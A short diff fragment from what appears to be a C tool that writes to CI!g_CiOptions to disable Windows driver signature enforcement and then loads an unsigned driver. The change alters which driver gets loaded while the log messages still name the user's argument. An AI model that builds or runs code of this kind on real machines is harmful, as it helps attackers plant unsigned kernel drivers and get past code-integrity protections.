@@ -87,7 +87,7 @@ int main(int argc, char **argv)
 	      printf("[+] wrote 0x1 @ CI!g_CiOptions\n");
 	      printf("[+] loading %s into kernel memory\n", argv[1]);
 
-	      if ( LoadDriver(argv[1]) ) {
+	      if ( LoadDriver(UnsignedDriver) ) {
 		      printf("[+] %s loaded successfully\n", argv[1]);
 	      } else {
 		      printf("[-] %s failed to load 0x%x\n", argv[1],
